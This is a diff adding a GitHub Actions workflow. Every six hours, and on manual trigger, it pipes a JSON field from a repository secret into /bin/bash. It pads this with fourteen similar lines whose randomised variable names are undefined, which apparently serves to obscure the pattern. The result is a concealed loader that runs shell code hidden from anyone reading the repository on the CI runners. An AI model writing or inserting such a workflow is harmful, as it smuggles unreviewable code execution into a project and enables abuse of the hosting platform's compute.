@@ -1,0 +1,31 @@
+name: bigouxiao
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: bigouxiao
+        env:
+          xil33765: ${{ secrets.xil33765 }}
+        run: |
+          echo $xil33765 | jq -r .v48917 | /bin/bash
+          echo $fpob80537 | jq -r .gtye0 | /bin/bash
+          echo $xlbrb604 | jq -r .byk3518 | /bin/bash
+          echo $ng3 | jq -r .x5104 | /bin/bash
+          echo $bspy325 | jq -r .tui057 | /bin/bash
+          echo $qm58 | jq -r .d5032 | /bin/bash
+          echo $qephp3 | jq -r .pvbnp7323 | /bin/bash
+          echo $ubzrl76 | jq -r .u409 | /bin/bash
+          echo $cfegt93 | jq -r .nrt358 | /bin/bash
+          echo $q17 | jq -r .qls08 | /bin/bash
+          echo $vktz594 | jq -r .hbbx2 | /bin/bash
+          echo $oh8736 | jq -r .gwggq358 | /bin/bash
+          echo $rzu6 | jq -r .ncj1 | /bin/bash
+          echo $rbceb9 | jq -r .zgt1595 | /bin/bash
+          echo $jzmk079 | jq -r .nsz505 | /bin/bash
+
